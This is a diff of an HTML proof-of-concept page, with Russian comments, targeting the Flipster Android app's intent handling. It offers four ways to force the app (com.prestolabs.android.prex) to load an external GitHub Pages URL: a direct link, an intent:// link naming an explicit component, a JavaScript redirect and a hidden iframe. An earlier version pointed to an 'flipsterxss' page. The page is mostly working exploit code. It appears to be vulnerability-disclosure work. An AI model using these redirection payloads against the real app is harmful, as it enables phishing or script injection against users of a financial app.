@@ -1,13 +1,42 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Flipster PoC</title>
-</head>
+<head><title>Flipster PoC</title></head>
 <body>
+    <h2>Flipster Intent Redirection PoC</h2>
+
+    <!-- Вариант 1: прямая ссылка -->
+    <a href="https://flipster.xyz/https://xaleraf4ra.github.io/test-poc.github.io/">
+        Open via direct link
+    </a>
 
     <br><br>
-    <a href="intent://flipster.xyz/https://xaleraf4ra.github.io/flipsterxss/#Intent;scheme=https;package=com.prestolabs.android.prex;end">
-        Open in Flipster (intent scheme)
+
+    <!-- Вариант 2: intent:// scheme с component -->
+    <a href="intent://flipster.xyz/https://xaleraf4ra.github.io/test-poc.github.io/#Intent;scheme=https;package=com.prestolabs.android.prex;component=com.prestolabs.android.prex/.presentations.ui.MainActivity;action=android.intent.action.VIEW;end">
+        Open via Intent scheme
     </a>
+
+    <br><br>
+
+    <!-- Вариант 3: JS redirect -->
+    <button onclick="openApp()">Open via JS redirect</button>
+
+    <br><br>
+
+    <!-- Вариант 4: iframe trick -->
+    <button onclick="openViaIframe()">Open via iframe</button>
+
+    <script>
+    function openApp() {
+        window.location = "intent://flipster.xyz/https://xaleraf4ra.github.io/test-poc.github.io/#Intent;scheme=https;package=com.prestolabs.android.prex;component=com.prestolabs.android.prex/.presentations.ui.MainActivity;action=android.intent.action.VIEW;end";
+    }
+
+    function openViaIframe() {
+        var iframe = document.createElement("iframe");
+        iframe.style.display = "none";
+        iframe.src = "intent://flipster.xyz/https://xaleraf4ra.github.io/test-poc.github.io/#Intent;scheme=https;package=com.prestolabs.android.prex;component=com.prestolabs.android.prex/.presentations.ui.MainActivity;action=android.intent.action.VIEW;end";
+        document.body.appendChild(iframe);
+    }
+    </script>
 </body>
 </html>
